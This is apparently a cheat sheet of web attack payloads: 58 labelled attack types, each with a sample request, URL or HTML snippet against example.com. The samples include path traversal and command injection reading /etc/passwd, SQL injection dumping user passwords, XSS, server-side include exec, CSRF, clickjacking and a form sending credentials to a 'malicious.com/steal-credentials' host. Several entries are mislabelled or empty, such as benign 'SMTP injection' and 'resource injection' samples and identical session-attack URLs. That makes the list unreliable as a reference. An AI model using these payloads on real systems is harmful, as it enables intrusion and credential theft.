### Exemplos de Payloads

#### 1. Arbitrary File Access
```http
http://example.com/index.php?page=../../../../etc/passwd
```

#### 2. Binary Planting
```http
http://example.com/upload?file=malicious.dll
```

#### 3. Blind SQL Injection
```http
http://example.com/index.php?id=1' AND SLEEP(5)--
```

#### 4. Blind XPath Injection
```http
http://example.com/search?query=' or 1=1 or 'a'='a
```

#### 5. Brute Force Attack
```plaintext
username=admin&password=password1
username=admin&password=password2
...
```

#### 6. Buffer Overflow Attack
```plaintext
A * 2048
```

#### 7. Cache Poisoning
```http
GET / HTTP/1.1
Host: victim.com
X-Forwarded-Host: attacker.com
```

#### 8. Clickjacking
```html
<iframe src="http://example.com" style="opacity:0; position:absolute; top:0; left:0; width:100%; height:100%;"></iframe>
```

#### 9. Command Injection
```http
http://example.com/?cmd=ls
http://example.com/?cmd=ls|cat%20/etc/passwd
```

#### 10. Comment Injection Attack
```http
http://example.com/index.php?id=1;-- 
```

#### 11. Content Spoofing
```html
http://example.com/page?message=<script>document.body.innerHTML='Hacked!'</script>
```

#### 12. Credential Stuffing
```plaintext
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
username=admin&password=password1
```

#### 13. Cross Frame Scripting
```html
<iframe src="http://example.com"></iframe>
```

#### 14. Cross Site History Manipulation (XSHM)
```javascript
history.pushState({}, '', '/malicious');
```

#### 15. Cross Site Tracing
```http
TRACE / HTTP/1.1
Host: example.com
```

#### 16. Cross-Site Request Forgery (CSRF)
```html
<img src="http://example.com/change-password?password=newpassword">
```

#### 17. Cross Site Port Attack (XSPA)
```http
http://example.com/?url=http://localhost:8080
```

#### 18. Cross-Site Scripting (XSS)
```html
<script>alert('XSS')</script>
<img src="x" onerror="alert('XSS')">
```

#### 19. Cross-User Defacement
```html
http://example.com/editProfile?name=<script>alert('Hacked!')</script>
```

#### 20. Custom Special Character Injection
```plaintext
http://example.com/index.php?input=%00
```

#### 21. Denial of Service
```http
GET / HTTP/1.1
Host: example.com
Content-Length: 10000000
```

#### 22. Direct Dynamic Code Evaluation (Eval Injection)
```javascript
http://example.com/index.php?input=eval("alert('XSS')")
```

#### 23. Execution After Redirect (EAR)
```http
http://example.com/redirect?url=http://malicious.com
```

#### 24. Exploitation of CORS
```http
Origin: null
```

#### 25. Forced Browsing
```http
http://example.com/admin
http://example.com/config
http://example.com/backup
```

#### 26. Form Action Hijacking
```html
<form action="http://malicious.com/steal-credentials">
  <input type="text" name="username">
  <input type="password" name="password">
  <input type="submit">
</form>
```

#### 27. Format String Attack
```plaintext
http://example.com/index.php?input=%x%x%x%x
```

#### 28. Full Path Disclosure
```http
http://example.com/index.php?file=../../../../etc/passwd
```

#### 29. Function Injection
```http
http://example.com/index.php?func=alert('Hacked')
```

#### 30. Host Header Injection
```http
GET / HTTP/1.1
Host: victim.com
X-Forwarded-Host: attacker.com
```

#### 31. HTTP Response Splitting
```http
GET / HTTP/1.1
Host: example.com%0D%0AContent-Length:0%0D%0A%0D%0AHTTP/1.1 200 OK
```

#### 32. HTTP Verb Tampering
```http
OPTIONS / HTTP/1.1
TRACE / HTTP/1.1
```

#### 33. HTML Injection
```html
http://example.com/index.php?input=<h1>Hacked</h1>
```

#### 34. LDAP Injection
```plaintext
http://example.com/index.php?user=*)(|(cn=admin)(password=*))(&(user
```

#### 35. Log Injection
```http
http://example.com/index.php?input=\r\nInjectedLogEntry
```

#### 36. Man-in-the-browser Attack
```plaintext
Inject malicious JavaScript into the browser
```

#### 37. Man-in-the-middle Attack
```plaintext
Intercept and modify HTTP traffic
```

#### 38. One-Click Attack
```html
<iframe src="http://example.com/perform-action" style="display:none;"></iframe>
```

#### 39. Parameter Delimiter
```plaintext
http://example.com/index.php?param1=value1;param2=value2
```

#### 40. Page Takeover
```html
<script>alert('Page Takeover')</script>
```

#### 41. Path Traversal
```http
http://example.com/index.php?file=../../../../etc/passwd
```

#### 42. Reflected DOM Injection
```javascript
http://example.com/index.php?input=<script>document.write('Hacked')</script>
```

#### 43. Regular expression Denial of Service (ReDoS)
```plaintext
http://example.com/index.php?input=a+a+a+a+a+a+a+a+a+a+a+
```

#### 44. Repudiation Attack
```http
http://example.com/deleteAccount?user=admin
```

#### 45. Resource Injection
```html
<img src="http://example.com/image.jpg">
```

#### 46. Server-Side Includes (SSI) Injection
```html
<!--#exec cmd="ls"-->
```

#### 47. Session Fixation
```http
http://example.com/index.php?sessionid=abc123
```

#### 48. Session Hijacking Attack
```http
http://example.com/index.php?sessionid=abc123
```

#### 49. Session Prediction
```http
http://example.com/index.php?sessionid=abc123
```

#### 50. Setting Manipulation
```http
http://example.com/index.php?setting=admin
```

#### 51. Special Element Injection
```html
http://example.com/index.php?input=<div>Special Element</div>
```

#### 52. SMTP Injection
```http
http://webmailexample.com/index.php?mail=recipient@example.com&body=Hello
```

#### 53. SQL Injection
```http
http://example.com/index.php?id=1' UNION SELECT username, password FROM users--
```

#### 54. SSI Injection
```html
<!--#exec cmd="ls"-->
```

#### 55. Traffic Flood
```plaintext
GET / HTTP/1.1
Host: example.com
(repeated many times)
```

#### 56. Web Parameter Tampering
```http
http://example.com/index.php?price=10&discount=90
```

#### 57. XPath Injection
```xml
http://example.com/index.php?query=' or 1=1 or 'a'='a
```

#### 58. XSRF or SSRF
```html
<img src="http://example.com/change-password?password=newpassword">
http://example.com/?url=http://localhost:8080
```
